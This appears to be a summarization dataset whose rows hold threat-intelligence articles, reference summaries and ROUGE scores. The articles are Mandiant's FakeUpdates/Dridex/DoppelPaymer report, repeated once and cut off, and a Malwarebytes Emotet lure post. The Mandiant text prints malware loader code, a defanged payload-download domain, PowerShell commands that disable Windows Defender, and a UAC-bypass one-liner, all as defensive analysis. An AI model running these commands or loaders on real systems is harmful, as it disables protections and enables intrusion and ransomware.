https://www.mandiant.com/resources/blog/head-fake-tackling-disruptive-ransomware-attacks;Head Fake: Tackling Disruptive Ransomware Attacks;"Within the past several months, FireEye has observed financially-motivated threat actors employ tactics that focus on disrupting business processes by deploying ransomware in mass throughout a victim's environment. Understanding that normal business processes are critical to organizational success, these ransomware campaigns have been accompanied with multi-million dollar ransom amounts. In this post, we'll provide a technical examination of one recent campaign that stems back to a technique that we initially reported on in April 2018.Between May and September 2019, FireEye responded to multiple incidents involving a financially-motivated threat actor who leveraged compromised web infrastructure to establish an initial foothold in victim environments. This activity bared consistencies with a fake browser update campaign first identified in April 2018 - now tracked by FireEye as FakeUpdates. In this newer campaign, the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport, and multiple post-exploitation frameworks. The threat actors' ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware (see Figure 1).Figure 1: Recent FakeUpdates infection chainDue to campaign proliferation, we have responded to this activity at both Mandiant Managed Defense customers and incident response investigations performed by Mandiant. Through Managed Defense network and host monitoring as well as Mandiant's incident response findings, we observed the routes the threat actor took, the extent of the breaches, and exposure of their various toolkits.Knock, Knock: FakeUpdates are Back!In April 2018, FireEye identified a campaign that used compromised websites to deliver heavily obfuscated Trojan droppers masquerading as Chrome, Internet Explorer, Opera, and/or Firefox browser updates. The compromised sites contained code injected directly into the HTML or in JavaScript components rendered by the pages which had been injected. These sites were accessed by victim users either via HTTP redirects or watering-hole techniques utilized by the attackers.Since our April 2018 blog post, this campaign has been refined to include new techniques and the use of post-exploitation toolkits. Recent investigations have shown threat actor activity that included internal reconnaissance, credential harvesting, privilege escalation, lateral movement, and ransomware deployment in enterprise networks. FireEye has identified that a large number of the compromised sites serving up the first stage of FakeUpdates have been older, vulnerable Content Management System (CMS) applications.You Are Using an Older Version...of our MalwareThe FakeUpdates campaign begins with a rather intricate sequence of browser validation, performed before the final payload is downloaded. Injected code on the initial compromised page will make the user's browser transparently navigate to a malicious website using hard-coded parameters. After victim browser information is gleaned, additional redirects are performed and the user is prompted to download a fake browser update. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and post-incident triage attempts on the compromise site(s).Figure 2: Example of FakeUpdate landing page after HTTP redirectsThe redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages.After clicking the 'Update' button, we observed the downloading of one of three types of files:Heavily-obfuscated HTML applications (.hta file extensions)JavaScript files (.js file extensions)ZIP-compressed JavaScript files (.zip extensions)Figure 3 provides a snippet of JavaScript that provides the initial download functionality.var domain = '//gnf6.ruscacademy[.]in/',var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206',var statTypeParamName = 'st', ... var filename = 'download.hta',var browser = 'Chrome',var special = '1',var filePlain = window.atob(file64),var a = document.getElementById('buttonDownload'),Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pagesWhen the user opens the initial FakeUpdates downloader, the Windows Scripting Host (wscript.exe) is executed and the following actions are performed:A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third party screenshot utility.Sends the captured screenshots to an attacker. The payload delivered in step 2 is subsequently executed by the script process.The backdoor and banking-trojan payloads described above have been identified as Dridex, NetSupport Manager RAT, AZOrult, and Chthonic malware. The strategy behind the selective payload delivery is unclear, however, the most prevalent malware delivered during this phase of the infection chain were variants of the Dridex backdoor.FakeUpdates: More like FakeHTTPAfter the end user executes the FakeUpdates download, the victim system will send a custom HTTP POST request to a hard-coded Command and Control (C2) server. The POST request, depicted in Figure 4, showed that the threat actors used a custom HTTP request for initial callback. The Age HTTP header, for example, was set to a string of 16 seemingly-random lowercase hexadecimal characters.Figure 4: Initial HTTP communication after successful execution of the FakeUpdates dropperThe HTTP Age header typically represents the time in seconds since an object has been cached by a proxy. In this case, via analysis of the obfuscated code on disk, FireEye identified that the Age header correlates to a scripted ""auth header"" parameter, likely used by the C2 server to validate the request. The first HTTP POST request also contains an XOR-encoded HTTP payload variable ""a="".The C2 server responds to the initial HTTP request with encoded JavaScript. When the code is decoded and subsequently executed, system and user information is collected using wscript.exe. The information collected from the victim system included:The malicious script that initialized the callbackSystem hostnameCurrent user accountActive Directory domainHardware details, such as manufacturerAnti-virus software detailsRunning processesThis activity is nearly identical to the steps observed in our April 2018 post, indicating only minor changes in data collection during this stage. For example, in the earlier iteration of this campaign, we did not observe the collection of the script responsible for the C2 communication. Following the system information gathering, the data is subsequently XOR-encoded and sent via another custom HTTP POST request request to the same C2 server, with the data included in the parameter ""b="". Figure 5 provides a snippet of sample of the second HTTP request.Figure 5: Second HTTP POST request after successful system information gatheringFigure 6 provides a copy of the decoded content, showing the various data points the malware transmitted back to the C2 server.0=5001=C:\Users\User\AppData\Local\Temp\Chrome.js2=AMD643=SYSTEM14=User5=46=Windows_NT7=DOMAIN8=HP9=HP EliteDesk10=BIOS_VERSION11=Windows Defender|Vendor Anti-Virus12=Vendor Anti-Virus|Windows Defender|13=00:00:00:00:00:0014=Enhanced (101- or 102-key)15=USB Input Device16=1024x76817=System Idle Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe| winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe...Figure 6: Decoded system information gathered by the FakeUpdates malwareAfter receiving the system information, the C2 server responds with an encoded payload delivered via chunked transfer-encoding to the infected system. This technique evades conventional IDS/IPS appliances, allowing for the second-stage payload to successfully download. During our investigations and FireEye Intelligence's monitoring, we recovered encoded payloads that delivered one of the following:Dridex (Figure 7)NetSupport Manage Remote Access Tools (RATs) (Figure 8)Chthonic or AZORult (Figure 9)function runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),wsh.Run('cmd /C rename ""' + _tempFilePathSave + '"" ""' + execFileName + '""'),WScript.Sleep(3 * 1000),runFileResult = wsh.Run('""' + _tempFilePathExec + '""'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 7: Code excerpt observed in FakeUpdates used to launch Dridex payloadsfunction runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),runFileResult = wsh.Run('""' + _tempFilePathExec + '"" /verysilent'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 8: Code excerpt observed in FakeUpdates used to launch NetSupport payloadsfunction runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),runFileResult = wsh.Run('""' + _tempFilePathExec + '""'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 9: Code excerpt observed in FakeUpdates used to launch Chthonic and AZORult payloadsDuring this process, the victim system downloads and executes nircmdc.exe, a utility specifically used during the infection process to save two system screenshots. Figure 10 provides an example command used to capture the desktop screenshots.""C:\Users\User\AppData\Local\Tempircmdc.exe"" savescreenshot ""C:\Users\User\AppData\Local\Temp\6206a2e3dc14a3d91.png""Figure 10: Sample command used to executed the Nircmd tool to take desktop screenshotsThe PNG screenshots of the infected systems are then transferred to the C2 server, after which they are deleted from the system. Figure 11 provides an example of a HTTP POST request, again with the custom Age and User-Agent headers.Figure 11: Screenshots of the infected system are sent to an attacker-controlled C2Interestingly, the screenshot file transfers were neither encoded nor obfuscated, as with other data elements transferred by the FakeUpdates malware. As soon as the screenshots are transferred, nircmdc.exe is deleted.All Hands on DeckIn certain investigations, the incident was far from over. Following the distribution of Dridex v4 binaries (botnet IDs 199 and 501), new tools and frameworks began to appear. FireEye identified the threat actors leveraged their Dridex backdoor(s) to execute the publicly-available PowerShell Empire and/or Koadic post-exploitation frameworks. Managed Defense also identified the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. These additional tools were often executed between 30 minutes and 2 hours after initial Dridex download. The pace of the initial phases of related attacks possibly suggests that automated post-compromise techniques are used in part before interactive operator activity occurs.We identified extensive usage of Empire and C2 communication to various servers during these investigations. For example, via process tracking, we identified a Dridex-injected explorer.exe executing malicious PowerShell: a clear sign of an Empire stager:Figure 12: An example of PowerShell Empire stager execution revealed during forensic analysisIn the above example, the threat actors instructed the victim system to use the remote server 185.122.59[.]78 for command-and-control using an out-of-the-box Empire agent C2 configuration for TLS-encrypted backdoor communications.During their hands-on post-exploitation activity, the threat actors also moved laterally via PowerShell remoting and RDP sessions. FireEye identified the use of WMI to create remote PowerShell processes, subsequently used to execute Empire stagers on domain-joined systems. In one specific case, the time delta between initial Empire backdoor and successful lateral movement was under 15 minutes. Another primary goal for the threat actor was internal reconnaissance of both the local system and domain the computer was joined to. Figure 13 provides a snippet of Active Directory reconnaissance commands issued by the attacker during one of our investigations.Figure 13: Attacker executed commandsThe threat actors used an Empire module named SessionGopher and the venerable Mimikatz to harvest endpoint session and credential information. Finally, we also identified the attackers utilized Empire's Invoke-EventVwrBypass, a Windows bypass technique used to launch executables using eventvwr.exe, as shown in Figure 14.""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update), powershell -NoP -NonI -W Hidden -enc $xFigure 14: PowerShell event viewer bypassRansomware Attacks & Operator TacticsWithin these investigations, FireEye identified the deployment BitPaymer or DoppelPaymer ransomware. While these ransomware variants are highly similar, DoppelPaymer uses additional obfuscation techniques. It also has enhanced capabilities, including an updated network discovery mechanism and the requirement of specific command-line execution. DoppelPaymer also uses a different encryption and padding scheme.The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware.Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Within days, this secondary Dridex instance was then used to enable the distribution of DoppelPaymer ransomware. Prior to DoppelPaymer, the threat actor deleted volume shadow copies and disabled anti-virus and anti-malware protections on select systems. Event log artifacts revealed commands executed through PowerShell which were used to achieve this step (Figure 15):Event Log EID Message Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Uninstall-WindowsFeature -Name Windows-Defender Application 1034 Windows Installer removed the product. Product Name: McAfee Agent-++-5.06.0011-++-1033-++-1603-++-McAfee, Inc.-++-(NULL)-++--++-. Product Version: 82.Figure 15: Event log entries related to the uninstallation of AV agents and disablement of real-time monitoringThe DoppelPaymer ransomware was found in an Alternate Data Stream (ADS) in randomly named files on disk. ADSs are attributes within NTFS that allow for a file to have multiple data streams, with only the primary being visible in tools such as Windows Explorer. After ransomware execution, files are indicated as encrypted by being renamed with a "".locked"" file extension. In addition to each "".locked"" file, there is a ransom note with the file name ""readme2unlock.txt"" which provides instructions on how to decrypt files.Figure 16: DoppelPaymer ransomware note observed observed during a Mandiant Incident Response investigationRansomware? Not In My House!Over the past few years, we have seen ransomware graduate from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets - some automated, some manual - with the ultimate goal of holding the victim organization hostage.Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don't need to get access to the most sensitive parts of your organization - they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. Mandiant recently published an in depth white paper on Ransomware Protection and Containment Strategies, which may help organizations mitigate the risk of ransomware events.IndicatorsThe following indicator set is a collective representation of artifacts identified during investigations into multiple customer compromises.Type Indicator(s) FakeUpdates Files 0e470395b2de61f6d975c92dea899b4f 7503da20d1f83ec2ef2382ac13e238a8 102ae3b46ddcb3d1d947d4f56c9bf88c aaca5e8e163503ff5fadb764433f8abb 2c444002be9847e38ec0da861f3a702b 62eaef72d9492a8c8d6112f250c7c4f2 175dcf0bd1674478fb7d82887a37317410eefc485a42fac3b928f960a98dc451a2ac7b9c0a049ceecc1f17022f16fdc6 FakeUpdates Domains & IP Addresses <8-Characters>.green.mattingsolutions[.]co<8-Characters>.www2.haciendarealhoa[.]com<8-Characters>.user3.altcoinfan[.]com93.95.100[.]178130.0.233[.]178185.243.115[.]84 gnf6.ruscacademy[.]in backup.awarfaregaming[.]com click.clickanalytics208[.]com track.amishbrand[.]com track.positiverefreshment[.]org link.easycounter210[.]com nircmdc.exe 8136d84d47cb62b4a4fe1f48eb64166e Dridex 7239da273d3a3bfd8d169119670bb745 72fe19810a9089cd1ec3ac5ddda22d3f07b0ce2dd0370392eedb0fc161c99dc7c8bb08283e55aed151417a9ad1bc7ad9 6e05e84c7a993880409d7a0324c10e74 63d4834f453ffd63336f0851a9d4c632 0ef5c94779cd7861b5e872cd5e922311 Empire C2 185.122.59[.]78 109.94.110[.]136Detecting the TechniquesFireEye detects this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer Ransomware. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances. This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring.Platform Signature Name Endpoint Security HX Exploit DetectionEmpire RAT (BACKDOOR)EVENTVWR PARENT PROCESS (METHODOLOGY)Dridex (BACKDOOR)Dridex A (BACKDOOR)POWERSHELL SSL VERIFICATION DISABLE (METHODOLOGY)SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)FAKEUPDATES SCREENSHOT CAPTURE (METHODOLOGY) Network Security Backdoor.FAKEUPDATESTrojan.Downloader.FakeUpdateExploit.Kit.FakeUpdateTrojan.SSLCert.SocGholishMITRE ATT&CK Technique MappingATT&CK Techniques Initial Access Drive-by Compromise (T1189), Exploit Public-Facing Application (T1190) Execution PowerShell (T1086), Scripting (T1064), User Execution (T1204), Windows Management Instrumentation (T1047) Persistence DLL Search Order Hijacking (T1038) Privilege Escalation Bypass User Account Control (T1088), DLL Search Order Hijacking (T1038) Defense Evasion Bypass User Account Control (T1088), Disabling Security Tools (T1089), DLL Search Order Hijacking (T1038), File Deletion (T1107), Masquerading (T1036), NTFS File Attributes (T1096), Obfuscated Files or Information (T1027), Scripting (T1064), Virtualization/Sandbox Evasion (T1497) Credential Access Credential Dumping (T1003) Discovery Account Discovery (T1087), Domain Trust Discovery (T1482), File and Directory Discovery (T1083), Network Share Discovery (T1135), Process Discovery (T1057), Remote System Discovery (T1018), Security Software Discovery (T1063), System Information Discovery (T1082), System Network Configuration Discovery (T1016), Virtualization/Sandbox Evasion (T1497) Lateral Movement Remote Desktop Protocol (T1076), Remote File Copy (T1105) Collection Data from Local System (T1005), Screen Capture (T1113) Command And Control Commonly Used Port (T1436), Custom Command and Control Protocol (T1094) ,Data Encoding (T1132), Data Obfuscation (T1001), Remote Access Tools (T1219), Remote File Copy (T1105), Standard Application Layer Protocol (T1071) Exfiltration Automated Exfiltration (T1020), Exfiltration Over Command and Control Channel (T1041) Impact Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490), Service Stop (T1489)AcknowledgementsA huge thanks to James Wyke and Jeremy Kennelly for their analysis of this activity and support of this post.Catch an on-demand recap on this and the Top 5 Managed Defense attacks this year.";"FireEye has observed that the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport, and multiple postexploitation frameworks. The threat actors' ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and postincident triage attempts on the compromise site(s).Figure 2: Example of FakeUpdate landing page after HTTP redirectsThe redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages.After clicking the 'Update' button, we observed the downloading of one of three types of files:Heavilyobfuscated HTML applications (.hta file extensions)JavaScript files (.js file extensions)ZIPcompressed JavaScript files (.zip extensions)Figure 3 provides a snippet of JavaScript that provides the initial download functionality.var domain = '//gnf6.ruscacademy[. ]in/';var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206';var statTypeParamName = 'st'; ... var filename = 'download.hta';var browser = 'Chrome';var special = '1';var filePlain = window.atob(file64);var a = document.getElementById('buttonDownload');Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pagesWhen the user opens the initial FakeUpdates downloader, the Windows Scripting Host (wscript.exe) is executed and the following actions are performed:A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third FireEye has observed the threat actors leveraging their Dridex backdoor(s) to execute the publiclyavailable PowerShell Empire and/or Koadic postexploitation frameworks. Managed Defense has also observed the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. FireEye has identified the deployment of BitPaymer or DoppelPaymer ransomware. The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware. Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Ransomware has evolved from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets some automated, some manual with the ultimate goal of holding the victim organization hostage. Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don't need to get access to the most sensitive parts of your organization they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. FireEye has detected this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances.";en;{'r': 0.25821972734562953, 'p': 0.9526627218934911, 'f': 0.40630914490950465};{'r': 0.2071307300509338, 'p': 0.9087523277467412, 'f': 0.3373660529739246};{'r': 0.25821972734562953, 'p': 0.9526627218934911, 'f': 0.40630914490950465}
https://www.malwarebytes.com/blog/news/2019/09/emotet-malspam-campaign-uses-snowdens-new-book-as-lure;Emotet malspam campaign uses Snowden's new book as lure;"Posted: September 23, 2019 byEmotet starts a new week of malicious spam by promising a copy of Edward Snowden's new book.Exactly one week ago, Emotet, one of the most dangerous threats to organizations in the last year, resumed its malicious spam campaigns after several months of inactivity. Based on our telemetry, we can see that the botnet started becoming chatty with its command and control servers (C2), about a week or so before the spam came through.Figure 1: Communications with Emotet C2s over 90 daysTo kick off its spam campaign last week, Emotet resumed spear phishing tactics it adopted in late spring 2019, hijacking old email threads with personalized subject lines and appearing as old invoices.This week, Emotet is trying a different tactic, incorporating the news about NSA whistleblower Edward Snowden's new book Permanent Record as a lure. The memoir, which is already on Amazon's bestseller list, has been the subject of intense debates. In addition, the US government is also suing Snowden for violating non-disclosure agreements and publishing without prior approval.Criminals are known to capitalize on newsworthy events for scams and other social engineering purposes. In this particular case, Emotet authors are supposedly offering Snowden's memoir as a Word attachment. We collected emails from our spam honeypot in English, Italian, Spanish, German and French claiming to contain a copy of Snowden's book in Word form.Upon opening the document, a fake message that ""Word hasn't been activated"" is displayed to victims who are prompted to enable the content with a yellow security warning. Once they do, nothing appears to happen. However, what users don't see is the malicious macro code that will execute once they click on the button.Figure 3: Fake document containing macro codeThe macro triggers a PowerShell command that will retrieve the Emotet malware binary from a compromised WordPress site. After infection, the machine will attempt to reach out to one of Emotet's many C2s:Figure 4: Network traffic upon infectionAs each new week rolls in, the threat actors behind Emotet are always punctual with delivering their spam messages, thanks to their large botnet. And once they've spammed and infiltrated an endpoint, their work is far from over. As we've said before, Emotet is a double or even triple threat if it is not quarantined right away.Follow up payloads, such as TrickBot and Ryuk ransomware are those that can truly cripple any business that is not prepared.Malwarebytes business users and Premium home users are already protected against this threat.Users who are not Malwarebytes customers or who use the free scanner will want to take additional steps to protect against Emotet or clean up the infection, if they've already been hit. Businesses and organizations that may currently be battling an Emotet infection can view our Emotet emergency kit, which includes a contact number for those in need of immediate assistance, as well as background information on how Emotet works and a list of protection and remediation tips.Indicators of Compromise (IOCs)Malicious Word document5ab7a5cf290ebf52647771f893a2fa322a9b1891e5a5e54811c500dd290c8477Emotet payload757b35d20f05b98f2c51fc7a9b6a57ccbbd428576563d3aff7e0c6b70d544975Network traffic";Emotet is a double or even triple threat if it is not quarantined right away. Follow up payloads, such as TrickBot and Ryuk ransomware are those that can truly cripple any business that is not prepared. Malwarebytes business users and Premium home users are already protected against this threat. Users who are not Malwarebytes customers or who use the free scanner will want to take additional steps to protect against Emotet or clean up the infection, if they've already been hit. Businesses and organizations that may currently be battling an Emotet infection can view our Emotet emergency kit, which includes a contact number for those in need of immediate assistance, as well as background information on how Emotet works and a list of protection and remediation tips.;en;{'r': 0.2879746835443038, 'p': 1.0, 'f': 0.4471744437025277};{'r': 0.2556237218813906, 'p': 1.0, 'f': 0.4071661205357617};{'r': 0.2879746835443038, 'p': 1.0, 'f': 0.4471744437025277}
https://www.mandiant.com/resources/blog/head-fake-tackling-disruptive-ransomware-attacks;Head Fake: Tackling Disruptive Ransomware Attacks;"Within the past several months, FireEye has observed financially-motivated threat actors employ tactics that focus on disrupting business processes by deploying ransomware in mass throughout a victim's environment. Understanding that normal business processes are critical to organizational success, these ransomware campaigns have been accompanied with multi-million dollar ransom amounts. In this post, we'll provide a technical examination of one recent campaign that stems back to a technique that we initially reported on in April 2018.Between May and September 2019, FireEye responded to multiple incidents involving a financially-motivated threat actor who leveraged compromised web infrastructure to establish an initial foothold in victim environments. This activity bared consistencies with a fake browser update campaign first identified in April 2018 - now tracked by FireEye as FakeUpdates. In this newer campaign, the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport, and multiple post-exploitation frameworks. The threat actors' ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware (see Figure 1).Figure 1: Recent FakeUpdates infection chainDue to campaign proliferation, we have responded to this activity at both Mandiant Managed Defense customers and incident response investigations performed by Mandiant. Through Managed Defense network and host monitoring as well as Mandiant's incident response findings, we observed the routes the threat actor took, the extent of the breaches, and exposure of their various toolkits.Knock, Knock: FakeUpdates are Back!In April 2018, FireEye identified a campaign that used compromised websites to deliver heavily obfuscated Trojan droppers masquerading as Chrome, Internet Explorer, Opera, and/or Firefox browser updates. The compromised sites contained code injected directly into the HTML or in JavaScript components rendered by the pages which had been injected. These sites were accessed by victim users either via HTTP redirects or watering-hole techniques utilized by the attackers.Since our April 2018 blog post, this campaign has been refined to include new techniques and the use of post-exploitation toolkits. Recent investigations have shown threat actor activity that included internal reconnaissance, credential harvesting, privilege escalation, lateral movement, and ransomware deployment in enterprise networks. FireEye has identified that a large number of the compromised sites serving up the first stage of FakeUpdates have been older, vulnerable Content Management System (CMS) applications.You Are Using an Older Version...of our MalwareThe FakeUpdates campaign begins with a rather intricate sequence of browser validation, performed before the final payload is downloaded. Injected code on the initial compromised page will make the user's browser transparently navigate to a malicious website using hard-coded parameters. After victim browser information is gleaned, additional redirects are performed and the user is prompted to download a fake browser update. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and post-incident triage attempts on the compromise site(s).Figure 2: Example of FakeUpdate landing page after HTTP redirectsThe redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages.After clicking the 'Update' button, we observed the downloading of one of three types of files:Heavily-obfuscated HTML applications (.hta file extensions)JavaScript files (.js file extensions)ZIP-compressed JavaScript files (.zip extensions)Figure 3 provides a snippet of JavaScript that provides the initial download functionality.var domain = '//gnf6.ruscacademy[.]in/',var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206',var statTypeParamName = 'st', ... var filename = 'download.hta',var browser = 'Chrome',var special = '1',var filePlain = window.atob(file64),var a = document.getElementById('buttonDownload'),Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pagesWhen the user opens the initial FakeUpdates downloader, the Windows Scripting Host (wscript.exe) is executed and the following actions are performed:A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third party screenshot utility.Sends the captured screenshots to an attacker. The payload delivered in step 2 is subsequently executed by the script process.The backdoor and banking-trojan payloads described above have been identified as Dridex, NetSupport Manager RAT, AZOrult, and Chthonic malware. The strategy behind the selective payload delivery is unclear, however, the most prevalent malware delivered during this phase of the infection chain were variants of the Dridex backdoor.FakeUpdates: More like FakeHTTPAfter the end user executes the FakeUpdates download, the victim system will send a custom HTTP POST request to a hard-coded Command and Control (C2) server. The POST request, depicted in Figure 4, showed that the threat actors used a custom HTTP request for initial callback. The Age HTTP header, for example, was set to a string of 16 seemingly-random lowercase hexadecimal characters.Figure 4: Initial HTTP communication after successful execution of the FakeUpdates dropperThe HTTP Age header typically represents the time in seconds since an object has been cached by a proxy. In this case, via analysis of the obfuscated code on disk, FireEye identified that the Age header correlates to a scripted ""auth header"" parameter, likely used by the C2 server to validate the request. The first HTTP POST request also contains an XOR-encoded HTTP payload variable ""a="".The C2 server responds to the initial HTTP request with encoded JavaScript. When the code is decoded and subsequently executed, system and user information is collected using wscript.exe. The information collected from the victim system included:The malicious script that initialized the callbackSystem hostnameCurrent user accountActive Directory domainHardware details, such as manufacturerAnti-virus software detailsRunning processesThis activity is nearly identical to the steps observed in our April 2018 post, indicating only minor changes in data collection during this stage. For example, in the earlier iteration of this campaign, we did not observe the collection of the script responsible for the C2 communication. Following the system information gathering, the data is subsequently XOR-encoded and sent via another custom HTTP POST request request to the same C2 server, with the data included in the parameter ""b="". Figure 5 provides a snippet of sample of the second HTTP request.Figure 5: Second HTTP POST request after successful system information gatheringFigure 6 provides a copy of the decoded content, showing the various data points the malware transmitted back to the C2 server.0=5001=C:\Users\User\AppData\Local\Temp\Chrome.js2=AMD643=SYSTEM14=User5=46=Windows_NT7=DOMAIN8=HP9=HP EliteDesk10=BIOS_VERSION11=Windows Defender|Vendor Anti-Virus12=Vendor Anti-Virus|Windows Defender|13=00:00:00:00:00:0014=Enhanced (101- or 102-key)15=USB Input Device16=1024x76817=System Idle Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe| winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe...Figure 6: Decoded system information gathered by the FakeUpdates malwareAfter receiving the system information, the C2 server responds with an encoded payload delivered via chunked transfer-encoding to the infected system. This technique evades conventional IDS/IPS appliances, allowing for the second-stage payload to successfully download. During our investigations and FireEye Intelligence's monitoring, we recovered encoded payloads that delivered one of the following:Dridex (Figure 7)NetSupport Manage Remote Access Tools (RATs) (Figure 8)Chthonic or AZORult (Figure 9)function runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),wsh.Run('cmd /C rename ""' + _tempFilePathSave + '"" ""' + execFileName + '""'),WScript.Sleep(3 * 1000),runFileResult = wsh.Run('""' + _tempFilePathExec + '""'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 7: Code excerpt observed in FakeUpdates used to launch Dridex payloadsfunction runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),runFileResult = wsh.Run('""' + _tempFilePathExec + '"" /verysilent'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 8: Code excerpt observed in FakeUpdates used to launch NetSupport payloadsfunction runFile() {var lastException = '',try {var wsh = new ActiveXObject(""WScript.Shell""),runFileResult = wsh.Run('""' + _tempFilePathExec + '""'),lastException = '',} catch (error) {lastException = error.number,runFileExeption += 'error number:' + error.number + ' message:' + error.message,}}Figure 9: Code excerpt observed in FakeUpdates used to launch Chthonic and AZORult payloadsDuring this process, the victim system downloads and executes nircmdc.exe, a utility specifically used during the infection process to save two system screenshots. Figure 10 provides an example command used to capture the desktop screenshots.""C:\Users\User\AppData\Local\Tempircmdc.exe"" savescreenshot ""C:\Users\User\AppData\Local\Temp\6206a2e3dc14a3d91.png""Figure 10: Sample command used to executed the Nircmd tool to take desktop screenshotsThe PNG screenshots of the infected systems are then transferred to the C2 server, after which they are deleted from the system. Figure 11 provides an example of a HTTP POST request, again with the custom Age and User-Agent headers.Figure 11: Screenshots of the infected system are sent to an attacker-controlled C2Interestingly, the screenshot file transfers were neither encoded nor obfuscated, as with other data elements transferred by the FakeUpdates malware. As soon as the screenshots are transferred, nircmdc.exe is deleted.All Hands on DeckIn certain investigations, the incident was far from over. Following the distribution of Dridex v4 binaries (botnet IDs 199 and 501), new tools and frameworks began to appear. FireEye identified the threat actors leveraged their Dridex backdoor(s) to execute the publicly-available PowerShell Empire and/or Koadic post-exploitation frameworks. Managed Defense also identified the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. These additional tools were often executed between 30 minutes and 2 